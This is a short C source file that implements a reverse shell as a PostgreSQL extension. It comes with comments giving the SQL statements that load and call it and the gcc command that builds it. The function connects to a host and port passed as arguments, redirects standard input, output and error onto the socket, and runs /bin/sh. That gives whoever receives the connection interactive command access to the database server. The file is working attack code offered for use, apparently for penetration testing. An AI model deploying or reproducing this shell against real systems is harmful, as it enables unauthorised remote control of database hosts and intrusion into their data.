// Reverse Shell as a Postgres Extension
// William Moody (@bmdyy)
// 08.02.2023

// CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '.../pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
// SELECT rev_shell('127.0.0.1', 443);
// DROP FUNCTION rev_shell;

// sudo apt install postgresql-server-dev-<version>
// gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c

#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>

#include "postgres.h"
#include "fmgr.h"
#include "utils/builtins.h"

PG_MODULE_MAGIC;

PG_FUNCTION_INFO_V1(rev_shell);

Datum
rev_shell(PG_FUNCTION_ARGS)
{
    // Get arguments
    char *LHOST = text_to_cstring(PG_GETARG_TEXT_PP(0));
    int32 LPORT = PG_GETARG_INT32(1);

    // Define necessary struct
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(LPORT); // LPORT
    inet_pton(AF_INET, LHOST, &serv_addr.sin_addr); // LHOST

    // Connect to target
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    int client_fd = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

    // Redirect STDOUT/IN/ERR to connection
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Start interactive /bin/sh
    execve("/bin/sh", NULL, NULL);

    PG_RETURN_INT32(0);
}
